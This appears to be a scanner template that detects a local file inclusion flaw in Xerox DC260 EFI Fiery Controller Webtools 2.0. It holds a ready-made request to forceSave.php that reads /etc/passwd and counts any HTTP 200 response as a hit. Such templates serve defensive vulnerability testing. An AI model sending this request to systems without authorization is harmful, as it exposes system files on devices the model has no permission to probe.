id: xerox-efi-lfi
brief:
    title: Xerox DC260 EFI Fiery Controller Webtools 2.0 - Local File Inclusion
    by: gy741
    level: high
    about: Xerox DC260 EFI Fiery Controller Webtools 2.0 is vulnerable to local file inclusion because input passed thru the 'file' GET parameter in 'forceSave.php' script is not properly sanitized before bei...
    label:
        - iot
        - xerox
        - disclosure
        - lfi
        - packetstorm
        - edb
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wt3/forceSave.php?file=/etc/passwd'
      signs:
        - "on": status
          status:
            - 200
